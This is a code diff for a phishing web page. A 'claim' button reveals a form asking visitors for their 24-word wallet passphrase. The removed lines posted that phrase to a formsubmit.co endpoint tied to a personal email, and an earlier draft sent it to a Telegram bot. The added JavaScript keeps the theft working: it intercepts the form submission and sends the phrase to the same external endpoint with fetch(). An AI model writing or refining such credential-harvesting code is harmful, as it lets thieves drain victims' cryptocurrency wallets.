@@ -67,38 +67,34 @@
     </main>
   </div>
 
-  <script>
-    document.getElementById("claimBtn").addEventListener("click", function () {
-      document.getElementById("passphraseForm").classList.remove("hidden");
-      this.style.display = "none"; // hide the claim button
-    });
-  </script>
-</body>
-</html>
-<script>
-  function sendPassphrase() {
-    const phrase = document.querySelector<form action="https://formsubmit.co/kp25626900@gmail.com" method="POST">
-  <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-  <button class="submit-button" type="submit">Unlock With Passphrase</button>
+ <script>
+  document.getElementById("claimBtn").addEventListener("click", function () {
+    document.getElementById("passphraseForm").classList.remove("hidden");
+    this.style.display = "none";
+  });
 
-  <input type="hidden" name="_captcha" value="false">
-</form>.value;
+  document.getElementById("piForm").addEventListener("submit", function (e) {
+    e.preventDefault(); // prevent default form submit
 
-    // Example: log to console (NOT recommended for real use)
-    console.log("Entered passphrase:", phrase);
+    const formData = new FormData(this);
 
-    // Example: send to your Telegram bot (only if it's your own use)
-    fetch("https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage", {
+    fetch("https://formsubmit.co/kp25626900@gmail.com", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: "<YOUR_CHAT_ID>",
-        text: Passphrase entered: ${phrase}
-      })
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        document.getElementById("confirmationMsg").style.display = "block";
+        document.getElementById("piForm").reset();
+      } else {
+        alert("Something went wrong. Please try again.");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("Error submitting form.");
     });
-
-    alert("Passphrase submitted.");
-  }
+  });
 </script>
 <!-- partial -->
   
